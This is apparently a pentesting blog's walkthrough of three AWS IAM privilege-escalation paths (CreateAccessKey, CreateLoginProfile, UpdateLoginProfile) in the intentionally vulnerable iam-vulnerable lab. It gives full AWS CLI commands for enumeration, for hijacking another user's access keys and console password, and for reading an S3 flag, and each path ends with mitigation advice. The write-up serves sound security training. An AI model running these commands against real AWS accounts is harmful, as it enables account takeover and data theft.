---
title: "AWS IAM Vulnerable Privilege Escalation"
categories:
- Cloud Security Penetration Testing
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2026-09-13-aws-iam-vulnerable-permissions-on-other-users-privilege-escalation
tags:
- AWS Pentesting
- AWS Cloud Pentesting
- EC2 Pentesting
- EC2
- Exploit Lambda
- Lambda Privilege Escalation
- IAM Vulnerable
- Cloudgoat Pentesting
- AWS Red Team
- S3 Bucket Enumeration
- Exploit S3 bucket
- Lambda Pentesting
- Pacu
- web vulnerability
- ethical hacking
- bug bounty
- application security
---

## Introduction

In this hands-on lab, we will explore how **misconfigured AWS IAM permissions can create privilege-escalation paths that allow an attacker to gain administrative control over an AWS account**.

We will use the [iam-vulnerable](https://github.com/BishopFox/iam-vulnerable) lab, an intentionally vulnerable AWS environment designed to demonstrate common IAM security weaknesses. Throughout the lab, we will start from a low-privileged IAM identity and analyze its permissions to identify potential privilege-escalation opportunities.

The lab will focus on understanding how seemingly limited permissions—such as the ability to create access keys, modify IAM policies, assume roles, or pass privileged roles to AWS services—can be chained together to reach a highly privileged identity.

By completing the lab, you will learn how to:

- Enumerate IAM users, roles, groups, and policies.
- Analyze IAM policies and identify excessive permissions.
- Understand common AWS IAM privilege-escalation techniques.
- Trace an attack path from a low-privileged user to an administrative identity.
- Validate the impact of an IAM misconfiguration in a controlled environment.
- Understand how these issues can be mitigated using least-privilege IAM policies.

The goal is not simply to exploit the vulnerable configuration, but to understand **why the misconfiguration exists, how an attacker could abuse it, and how defenders can prevent similar privilege-escalation paths in real AWS environments**.

## Lab Setup

Deployed `iam-vulnerable` lab with user which has `AdministrativeAccess` permission.

## Path 1: IAM:CreateAccessKey Privilege Escalation

**`iam:CreateAccessKey` privilege escalation** is an AWS IAM misconfiguration where a low-privileged user is allowed to create an **access key for another IAM user**, particularly a user with higher privileges.

### Identified Compromised IAM User

To identified user which has `CreateAccessKey` permission, I used [aws_iam_viewer](https://github.com/kabinet01/aws_iam_viewer).

**Step 1** - Spin the aws_iam_viewer 

```
┌──(packetbreakers㉿kali)-[~]
└─$ cd aws_iam_viewer 

┌──(packetbreakers㉿kali)-[~/aws_iam_viewer]
└─$ docker compose up --build
```

**Step 2** - Access it in the browser.

![awsiamviewer.png](awsiamviewer.png)

**Step 3** - Extract data for aws_iam_viewer.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam get-account-authorization-details --output json > account-authorization-details.json
```

![dashboard.png](dashboard.png)

![privesc4.png](privesc4.png)

**Step 4**- Import data and analyze.

**Result -** Identify a policy `privesc4-CreateAccessKey` which is attached to the user `privesc4-CreateAccessKey-user` has permission to create access key for any iam user.

## IAM User Enumeration `privesc4-CreateAccessKey-user`

**Step 1** - Retrieve the information about IAM user `privesc4-CreateAccessKey-user` .

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam get-user --user privesc4-CreateAccessKey-user --profile iamprivesc
{
    "User": {
        "Path": "/",
        "UserName": "privesc4-CreateAccessKey-user",
        "UserId": "AIDATBC5OUAVERSNY25C6",
        "Arn": "arn:aws:iam::208501907498:user/privesc4-CreateAccessKey-user",
        "CreateDate": "2026-09-11T07:14:38+00:00"
    }
}
```

**Step 2** - List the attached managed policy attached to the current user.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam list-attached-user-policies --user privesc4-CreateAccessKey-user --profile iamprivesc
{
    "AttachedPolicies": [
        {
            "PolicyName": "privesc4-CreateAccessKey",
            "PolicyArn": "arn:aws:iam::208501907498:policy/privesc4-CreateAccessKey"
        }
    ]
}
```

**Result** - `CreateAccessKey` policy is attached to the user.

**Step 3** -  Check the metadata of the policy.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam get-policy --policy-arn arn:aws:iam::208501907498:policy/privesc4-CreateAccessKey --profile iamprivesc
{
    "Policy": {
        "PolicyName": "privesc4-CreateAccessKey",
        "PolicyId": "ANPATBC5OUAVK6TAIPZ36",
        "Arn": "arn:aws:iam::208501907498:policy/privesc4-CreateAccessKey",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 2,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Allows privesc via iam:CreateAccessKey",
        "CreateDate": "2026-09-11T07:14:36+00:00",
        "UpdateDate": "2026-09-11T07:14:36+00:00",
        "Tags": []
    }
}
```

**Result** -  `DefaultVersionID` v1 is used.

**Step 4** - Check the permission assign to the user via using versionid of the policy.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::208501907498:policy/privesc4-CreateAccessKey --profile iamprivesc --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "iam:CreateAccessKey",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2026-09-11T07:14:36+00:00"
    }
}
```

**Result** - The policy allows the `iam:CreateAccessKey` action on any IAM user, because the `Resource` is set to `*`. This means the user is not restricted to creating access keys only for a specific IAM identity.

As a result, if a higher-privileged IAM user exists in the account, an attacker who compromises this identity may be able to create access keys for that privileged user and use the resulting credentials to perform actions permitted by the target user's permissions. This can potentially lead to significant privilege escalation, including administrative control of the AWS account.

## IAM User Enumeration victimuser 

To demonstrate the exploit, I created an IAM user `victimuser` and provide the `s3` bucket permission to list, read and write access.

**Step 1** - Check the `victiuser` permission.

![victimuser.png](victimuser.png)

**Result** - Identified `S3` bucket `iam-privesc-lab-208501907498,` user `victimuser` have read write access to this bucket.

**Step 2** -  Try list the bucket as user `privesc4`.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws s3 ls s3://iam-privesc-lab-208501907498/ --profile privesc4                    

aws: [ERROR]: An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:sts::208501907498:assumed-role/privesc4-CreateAccessKey-role/botocore-session-1789154224 is not authorized to perform: s3:ListBucket on resource: "arn:aws:s3:::iam-privesc-lab-208501907498" because no identity-based policy allows the s3:ListBucket action
```

**Result** - User privesc4 doesn’t have permission to list the bucket.

## Exploit Privilege Escalation

To exploit privilege escalation path in the misconfig `iam:CreateAccessKey` , we follow below steps.

**Step 1** - Create access key for user `victimuser.`

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam create-access-key --user-name victimuser --profile privesc4                
{
    "AccessKey": {
        "UserName": "victimuser",
        "AccessKeyId": "******************ELPIK45U",
        "Status": "Active",
        "SecretAccessKey": "*******************lXrTb/4DyGkPhDUq",
        "CreateDate": "2026-09-11T19:22:16+00:00"
    }
}
```

**Result** - Access key and Secret key for `victimuser` are created via user `privesc4` .

**Step 2** - Configure newly generate access key and secret in the AWS CLI and verify.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws configure --profile victimuser                             

Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the command 'aws login'.

AWS Access Key ID [None]: *******************LPIK45U
AWS Secret Access Key [None]: *********************KbZ3lXrTb/4DyGkPhDUq
Default region name [None]: us-east-1
Default output format [None]: json
```

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws sts get-caller-identity --profile victimuser               
{
    "UserId": "AIDATBC5OUAVGAQFNQU7L",
    "Account": "208501907498",
    "Arn": "arn:aws:iam::208501907498:user/victimuser"
}
```

**Step 3** - We have created access key and secret for victim user, we can list the S3 bucket.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws s3 ls s3://iam-privesc-lab-208501907498/ --profile victimuser                  
2026-09-11 23:43:28         32 flag.txt
```

**Step 4** - S3 bucket has flag.txt file, download it locally and read the content.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws s3 cp s3://iam-privesc-lab-208501907498/flag.txt . --profile victimuser
download: s3://iam-privesc-lab-208501907498/flag.txt to ./flag.txt
```

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ cat flag.txt             
You Won! Escalate the privilege
```

**Result** - Successfully exploit iam:CreateAccessKey privilege escalation path and capture the flag.

## Mitigation

- **Follow least privilege** - Do not grant iam:CreateAccessKey unless it is genuinely required.
- **Restrict the resource** - If access-key creation is required, limit it to specific users or, where appropriate, only the caller's own IAM user.
- **Prefer temporary credentials** - Use IAM roles, AWS STS, or federation instead of long-lived access keys whenever possible.

## Path 2: IAM:CreateLoginProfile Privilege Escalation

`iam:CreateLoginProfile` is an AWS IAM permission that allows a principal to create a **console login profile (password)** for an IAM user.

It becomes a **privilege-escalation vulnerability** when a low-privileged user can create a login profile for a **more privileged IAM user**.

## Identified Compromised IAM User

To identified user which has CreateLoginProfile permission, I used aws_iam_viewer aws_iam_viewer.

![privesc5.png](privesc5.png)

**Result**- CreateLoginProfile policy is attached to the user privesc5 , hence this user has permission to create console login profile password for any IAM user.

## IAM User Enumeration `privesc5-CreateLoginProfile-user`

**Step 1** - Verify the user.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws sts get-caller-identity --profile privesc5                                                                                           
{
    "UserId": "AROATBC5OUAVKCQK3525H:botocore-session-1789156364",
    "Account": "208501907498",
    "Arn": "arn:aws:sts::208501907498:assumed-role/privesc5-CreateLoginProfile-role/botocore-session-1789156364"
}
```

**Step 2** - Retrieve the information about IAM user privesc5-CreateLoginProfile-user 

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam get-user --user privesc5-CreateLoginProfile-user --profile iamprivesc
{
    "User": {
        "Path": "/",
        "UserName": "privesc5-CreateLoginProfile-user",
        "UserId": "AIDATBC5OUAVFXE73VWL7",
        "Arn": "arn:aws:iam::208501907498:user/privesc5-CreateLoginProfile-user",
        "CreateDate": "2026-09-11T07:14:40+00:00"
    }
}
```

**Step 3** - List the attached managed policy attached to the current user.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$  aws iam list-attached-user-policies --user privesc5-CreateLoginProfile-user --profile iamprivesc
{
    "AttachedPolicies": [
        {
            "PolicyName": "privesc5-CreateLoginProfile",
            "PolicyArn": "arn:aws:iam::208501907498:policy/privesc5-CreateLoginProfile"
        }
    ]
}
```

**Result** - `CreateLoginProfile` policy is attached to the user.

**Step 4** -  Check the metadata of the policy.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam get-policy --policy-arn arn:aws:iam::208501907498:policy/privesc5-CreateLoginProfile --profile iamprivesc
{
    "Policy": {
        "PolicyName": "privesc5-CreateLoginProfile",
        "PolicyId": "ANPATBC5OUAVJHPXMKIMA",
        "Arn": "arn:aws:iam::208501907498:policy/privesc5-CreateLoginProfile",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 2,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Allows privesc via iam:CreateLoginProfile",
        "CreateDate": "2026-09-11T07:14:39+00:00",
        "UpdateDate": "2026-09-11T07:14:39+00:00",
        "Tags": []
    }
}
```

**Result** -  `DefaultVersionID` v1 is used.

**Step 5** - Check the permission assign to the user via using versionid of the policy.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::208501907498:policy/privesc5-CreateLoginProfile --profile iamprivesc --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "iam:CreateLoginProfile",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2026-09-11T07:14:39+00:00"
    }
}
```

**Result** - The policy allows the `iam:CreateLoginProfile` action on any IAM user, because the `Resource` is set to `*`. This means the user is not restricted to creating login profile only for a specific IAM identity.

As a result, if a higher-privileged IAM user exists in the account, an attacker who compromises this identity may be able to create login profile for that privileged user and log in to the console via create login password, he can perform actions permitted by the target user's permissions. This can potentially lead to significant privilege escalation, including administrative control of the AWS account.

## IAM User Enumeration `victimuser`

To demonstrate the exploit, I created an IAM user `victimuser` . Console login is disabled for this user.

**Step 1** - Verify console login for victim user

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam get-login-profile --user-name victimuser --profile iamprivesc 

aws: [ERROR]: An error occurred (NoSuchEntity) when calling the GetLoginProfile operation: Login Profile for User victimuser cannot be found.
```

**Result** - Console login is not enable for `victimuser`.

**Step 2** - Create login profile for user `victimuser` .

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam create-login-profile --user-name victimuser --password Packetbreakers123! --no-password-reset-required --profile privesc5        
{
    "LoginProfile": {
        "UserName": "victimuser",
        "CreateDate": "2026-09-11T19:53:23+00:00",
        "PasswordResetRequired": false
    }
}
```

**Result** - Login profile is successfully created.

**Step 3** - Log in to console with user `victimuser` with the above set password.

![consoleloginvictimuser.png](consoleloginvictimuser.png)

**Step 4** - Successfully log in to the console of the victimuser.

![consoleloginsuccessfull.png](consoleloginsuccessfull.png)

**Result**- We successfully escalate our privilege, create login password for victim user and log in to his console. 

## Mitigation

- **Apply least privilege** - Do not grant iam:CreateLoginProfile unless it is required.
- **Restrict which users can be modified** - Limit the permission to specific, approved IAM users rather than all users.
- **Use IAM roles instead of IAM user passwords** - For human and workload access, prefer IAM roles, AWS STS, and federation where possible.

## Path 3: IAM:UpdateLoginProfile Privilege Escalation

`iam:UpdateLoginProfile` is an AWS IAM permission that allows a principal to **change the console login profile (password) of an IAM user**.

It becomes a **privilege-escalation vulnerability** when a low-privileged user can update the login profile of a **higher-privileged IAM user**.

## Identified Compromised IAM User

To identified user which has `CreateLoginProfile` permission, I used `aws_iam_viewer` https://github.com/kabinet01/aws_iam_viewer.

![privesc6.png](privesc6.png)

**Result** - UpdateLoginProfile policy is attached to the user privesc6 , hence this user has permission to update console login profile password for any IAM user.

## IAM User Enumeration `privesc6-UpdateLoginProfile-user`

**Step 1** - Verify the user.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws sts get-caller-identity --profile privesc6                                                                                    
{
    "UserId": "AROATBC5OUAVA4JNQT3UJ:botocore-session-1789193597",
    "Account": "208501907498",
    "Arn": "arn:aws:sts::208501907498:assumed-role/privesc6-UpdateLoginProfile-role/botocore-session-1789193597"
}
```

**Step 2** - Retrieve the information about IAM user privesc5-UpdateLoginProfile-user

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam get-user --user privesc6-UpdateLoginProfile-user --profile iamprivesc
{
    "User": {
        "Path": "/",
        "UserName": "privesc6-UpdateLoginProfile-user",
        "UserId": "AIDATBC5OUAVFG26BFYGU",
        "Arn": "arn:aws:iam::208501907498:user/privesc6-UpdateLoginProfile-user",
        "CreateDate": "2026-09-11T07:14:37+00:00"
    }
}
```

**Step 3** - List the attached managed policy attached to the current user.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam list-attached-user-policies --user privesc6-UpdateLoginProfile-user --profile iamprivesc
{
    "AttachedPolicies": [
        {
            "PolicyName": "privesc6-UpdateLoginProfile",
            "PolicyArn": "arn:aws:iam::208501907498:policy/privesc6-UpdateLoginProfile"
        }
    ]
}
```

**Result** - Get the `PolicyArn` details.

**Step 4** -  Check the metadata of the policy.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam get-policy --policy-arn arn:aws:iam::208501907498:policy/privesc6-UpdateLoginProfile --profile iamprivesc
{
    "Policy": {
        "PolicyName": "privesc6-UpdateLoginProfile",
        "PolicyId": "ANPATBC5OUAVMSVLZL6DQ",
        "Arn": "arn:aws:iam::208501907498:policy/privesc6-UpdateLoginProfile",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 2,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "Allows privesc via iam:UpdateLoginProfile",
        "CreateDate": "2026-09-11T07:14:42+00:00",
        "UpdateDate": "2026-09-11T07:14:42+00:00",
        "Tags": []
    }
}
```

**Result** -  `DefaultVersionID` v1 is used.

**Step 5** - Check the permission assign to the user via using versionid of the policy.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::208501907498:policy/privesc6-UpdateLoginProfile --profile iamprivesc --version-id v1 
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": "iam:UpdateLoginProfile",
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2026-09-11T07:14:42+00:00"
    }
}
```

**Result** - The policy allows the `iam:UpdateLoginProfile` action on any IAM user, because the `Resource` is set to `*`. This means the user is not restricted to update login password only for a specific IAM identity.

As a result, if a higher-privileged IAM user exists in the account, an attacker who compromises this identity may be able to update login password for that privileged user and log in to the console via updated login password, he can perform actions permitted by the target user's permissions. This can potentially lead to significant privilege escalation, including administrative control of the AWS account.

## IAM User Enumeration `victimuser`

To demonstrate the exploit, I created an IAM user `victimuser` . Console login is enable for this user. We will exploit the `iam:UpdateLoginProfile` permission and update the password for user `victimuser` .

**Step 1** - Verify user `victimuser` has console login enabled.

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam get-login-profile --user-name victimuser --profile iamprivesc
{
    "LoginProfile": {
        "UserName": "victimuser",
        "CreateDate": "2026-09-12T05:59:46+00:00",
        "PasswordResetRequired": false
    }
}
```

**Result** - Login profile is enabled for `victimuser` .

**Step 2** - Update the console password for the `victimuser` .

```
┌──(packetbreakers㉿kali)-[~/awsiamprivesc]
└─$ aws iam update-login-profile --user-name victimuser --password Packet@breakers123! --no-password-reset-required --profile privesc6  
```

**Result** - No error shows that password is updated for `victimuser`.

**Step 3** - Try log in to console of victimuser  with updated password. 

![consolelogin.png](consolelogin.png)

![loginsuccessfully.png](loginsuccessfully.png)

**Result** - Successfully log in to the victimuser console, which shows that we successfully exploit the iam:UpdateLoginProfile permission.

## Mitigation

- **Apply least privilege** - Do not grant iam:UpdateLoginProfile unless absolutely necessary.
- **Prefer IAM roles and federation** - Use IAM roles, AWS STS, or federated identity for human access instead of managing long-lived IAM user passwords.
- **Enable MFA for console access** - Require MFA for privileged accounts. Password control alone should not be sufficient for sensitive access.



